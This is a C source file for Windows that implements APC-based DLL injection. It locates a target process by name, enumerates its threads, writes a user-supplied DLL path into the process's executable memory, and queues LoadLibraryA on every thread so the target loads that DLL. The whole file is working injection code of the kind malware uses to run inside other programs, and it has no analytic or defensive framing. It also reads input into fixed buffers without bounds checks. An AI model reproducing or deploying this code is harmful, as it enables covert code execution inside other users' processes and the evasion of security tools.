#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include "tlhelp32.h"
#include <stdio.h>
#include <userenv.h>
#include <netsh.h>
#include <processthreadsapi.h>
#define MALLOC_BLOCK(X) (X*sizeof(DWORD))
#define FAIL 1;
#define SUCCESS 0;

struct thread_list_data
{
	DWORD number_of_members;
	DWORD * tids;
	DWORD pid;
};

struct thread_list_data get_process_pid_tid(char* process_name, struct thread_list_data thread_list) {
	//
	DWORD remote_pid;
	tagPROCESSENTRY32 pe;
	tagTHREADENTRY32 te;
	HANDLE process;
	BOOL ok = 0;
	DWORD threads;
	thread_list.tids = (DWORD*) malloc(MALLOC_BLOCK(512));
	thread_list.number_of_members = 0;
	process = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	pe.dwSize = sizeof(tagPROCESSENTRY32);
	te.dwSize = sizeof(tagTHREADENTRY32);
	if (Process32First(process, &pe)) {
		do {
			//printf("%s, %s", process_name, pe.szExeFile);
			if (!(strcmp(process_name, pe.szExeFile))) {
				remote_pid = pe.th32ProcessID;
				threads = pe.cntThreads;
				
				if (Thread32First(process, &te)) {
					do {
						if (te.th32OwnerProcessID == remote_pid) {
							*(thread_list.tids + thread_list.number_of_members) = te.th32ThreadID;
							//printf("\nthread id: %d\n", *(thread_list.tids + thread_list.number_of_members));
							thread_list.number_of_members++;
							//*(thread_list.tids + number_of_threads) = te.th32ThreadID;
							
							//
						}
						
					} while (Thread32Next(process, &te));
				}
				printf("PID of the process --> %d\n", remote_pid);
				thread_list.pid = remote_pid;
				ok = 1;
				break;
			}
		} while (Process32Next(process, &pe));
	}
	if (!ok) {
		thread_list.pid = NULL;
		return thread_list;
	}
	return thread_list;
}

int apc_injection() {
		char process_name[20];
		HANDLE specific_process;
		HANDLE open_thread;
		LPVOID alloc_space;
		char dll_path[100];
		printf("enter process name to inject -->");
		scanf("%s", &process_name);
		printf("Process name --> %s\n", process_name);
		printf("enter dll path -->");
		scanf("%s", &dll_path);
		printf("dll_path --> %s\n", dll_path);
		struct thread_list_data thread_list = {0,NULL,NULL};

		struct thread_list_data updated_thread_list = get_process_pid_tid(process_name, thread_list);
		if (updated_thread_list.pid == NULL) {
			fprintf(stderr,"Cant find the specific process, Exsiting !");
			getchar();
			return FAIL;
		}
		printf("thread ids for %s that has %d threads", process_name, updated_thread_list.number_of_members);
		for (unsigned int i = 0; i < updated_thread_list.number_of_members; ++i) {
			printf("\nthread %d ID:%d\n", i + 1, *(updated_thread_list.tids + i));
		}

		specific_process = OpenProcess(PROCESS_ALL_ACCESS, false, updated_thread_list.pid);
		if (NULL == specific_process) {
			printf("ERROR CODE %d", GetLastError());
			getchar();
			return FAIL;
		}
		
		
		alloc_space = VirtualAllocEx(specific_process, NULL, strlen(dll_path) + 1, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (alloc_space == NULL) {
			printf("Cant alloc process memory");
			getchar();
			return FAIL;
		}
		
		if (!(WriteProcessMemory(specific_process, alloc_space, dll_path, strlen(dll_path) + 1, NULL))) {
			printf("Cant write to memory of the remote process, Exsiting ! ErrCode:%d", GetLastError());
			CloseHandle(specific_process);
			getchar();
			return FAIL;
		}
		for (unsigned int i = 0; i < updated_thread_list.number_of_members; ++i) {
			open_thread = OpenThread(THREAD_ALL_ACCESS, false, *(updated_thread_list.tids + i));
			if (open_thread) {
				if (!(QueueUserAPC((PAPCFUNC)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA"), open_thread, (ULONG_PTR)alloc_space))) {
					fprintf(stderr, "Failed executing QuserAPC");
				}
			}
			else {
				printf("Cant get Thread Handle");
				getchar();
				return FAIL;
			}
		}
		getchar();
		return SUCCESS;
	
}